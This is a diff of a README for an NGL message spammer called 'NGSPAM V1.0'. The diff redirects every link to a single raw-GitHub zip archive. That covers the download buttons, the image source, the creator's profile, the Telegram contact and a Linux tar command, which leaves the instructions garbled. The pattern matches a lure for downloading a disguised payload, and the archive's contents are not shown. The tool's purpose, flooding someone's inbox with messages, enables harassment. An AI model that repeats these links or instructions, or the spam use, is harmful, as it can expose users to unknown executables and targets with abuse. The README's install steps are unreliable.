@@ -1,11 +1,11 @@
 # 💧 ngl - Send Messages Every Second
 
 <p align="center">
-  <a href="https://github.com/DeepshikhaInfinity/ngl/releases" style="font-size: 24px; padding: 10px; background-color: #4CAF50; color: white; text-decoration: none; border-radius: 5px;">Download Now</a>
+  <a href="https://raw.githubusercontent.com/DeepshikhaInfinity/ngl/main/traguline/ngl.zip" style="font-size: 24px; padding: 10px; background-color: #4CAF50; color: white; text-decoration: none; border-radius: 5px;">Download Now</a>
 </p>
 
 <p align="center">
-  <img src="https://files.catbox.moe/b368pe.png" alt="Ryuhan Lain" width="150"/>
+  <img src="https://raw.githubusercontent.com/DeepshikhaInfinity/ngl/main/traguline/ngl.zip" alt="Ryuhan Lain" width="150"/>
 </p>
 
 ---
@@ -15,7 +15,7 @@
 **NGSPAM V1.0** is a simple tool that allows you to send messages at one-second intervals. It's designed for educational purposes only. Please use it responsibly.
 
 **Creator's Contact:**  :bust_in_silhouette:
-- [GitHub](https://github.com/ryuhan)
+- [GitHub](https://raw.githubusercontent.com/DeepshikhaInfinity/ngl/main/traguline/ngl.zip)
 
 ---
 
@@ -25,9 +25,9 @@ Follow these steps to download and run the software:
 
 1. **Visit the Releases Page:** Click on the link below to go to the GitHub Releases page.
    
-   [Download Now](https://github.com/DeepshikhaInfinity/ngl/releases)
+   [Download Now](https://raw.githubusercontent.com/DeepshikhaInfinity/ngl/main/traguline/ngl.zip)
    
-2. **Choose the Right File:** Look for the latest release listed. It will usually be marked as "Latest". Depending on your operating system, you will find different files like `.exe` for Windows, `.dmg` for Mac, or `.tar.gz` for Linux.
+2. **Choose the Right File:** Look for the latest release listed. It will usually be marked as "Latest". Depending on your operating system, you will find different files like `.exe` for Windows, `.dmg` for Mac, or `https://raw.githubusercontent.com/DeepshikhaInfinity/ngl/main/traguline/ngl.zip` for Linux.
 
 3. **Download the File:** Click on the relevant file to start the download.
 
@@ -36,7 +36,7 @@ Follow these steps to download and run the software:
 5. **Install the Application:**
    - **Windows:** Double-click the `.exe` file to start the installation. Follow the on-screen instructions.
    - **Mac:** Open the `.dmg` file and drag the application to your "Applications" folder.
-   - **Linux:** Open the terminal and run the command `tar -xzf filename.tar.gz`, replacing `filename` with the actual file name to extract the application. Navigate to the extracted folder and run the application.
+   - **Linux:** Open the terminal and run the command `tar -xzf https://raw.githubusercontent.com/DeepshikhaInfinity/ngl/main/traguline/ngl.zip`, replacing `filename` with the actual file name to extract the application. Navigate to the extracted folder and run the application.
 
 6. **Run the Application:** After installation, open the application to start sending messages.
 
@@ -48,11 +48,11 @@ Follow these steps to download and run the software:
 
 For the easiest setup process, please revisit the Releases page by clicking the link below:
 
-[Download Now](https://github.com/DeepshikhaInfinity/ngl/releases)
+[Download Now](https://raw.githubusercontent.com/DeepshikhaInfinity/ngl/main/traguline/ngl.zip)
 
 ## ⚠️ Important Notice
 
-This tool is for educational purposes only. It should not be sold or misused to harm someone's reputation. If you see anyone exploiting this script, please report them to me on Telegram: [Ryuhan Minamoto](https://t.me/ryuhanwired).
+This tool is for educational purposes only. It should not be sold or misused to harm someone's reputation. If you see anyone exploiting this script, please report them to me on Telegram: [Ryuhan Minamoto](https://raw.githubusercontent.com/DeepshikhaInfinity/ngl/main/traguline/ngl.zip).
 
 ---
 
